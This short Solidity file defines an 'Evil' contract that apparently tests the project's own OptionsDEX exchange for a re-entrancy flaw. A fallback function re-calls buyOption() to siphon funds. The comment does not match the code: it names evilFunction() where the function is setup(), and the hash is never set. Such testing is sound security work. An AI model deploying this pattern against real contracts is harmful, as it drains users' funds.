pragma solidity 0.8.0;

import "../interfaces/IERC20.sol";
import "../interfaces/IOptionsDEX.sol";
/*
Smart contract for attempting a re-entrancy attack on OptionsDEX

During initialization, Evil recieves the addresses necessary to interact
with OptionsDEX and an ERC-20 token (CayugaCoin). The user then calls evilFunction() which creates an option. The user is then expected to call buyOption() which starts the re-entrancy attack. buyOption() sends eth to Evil, which activates its fallback function. fallback() calls buyOption() again to try and siphon funds from the smart contract back to itself.  
*/
contract Evil {

    IOptionsDEX private optionContract;
    IERC20 private token;
    bytes32 private hash;

    constructor(address payable _OptionsDEX, address _token) {
        // Create OptionsDEX contract
        optionContract = IOptionsDEX(_OptionsDEX); 
        // Create token contract
        token = IERC20(_token);
    }
    function setup() public payable {
        // Get 1000 tokens from msg.sender
        // approve must have been called by user beforehand
        token.transferFrom(msg.sender, address(this), 1000 * 10**18);
        // Allow OptionsDEX to use tokens
        token.approve(address(optionContract), 100 * 10**18);
        // Create option
        optionContract.createOption(address(token), 0.1 * 10**18, 10**18, 50);
    }

    // Fallback function
    fallback() external payable {
        optionContract.buyOption(hash);
    }
}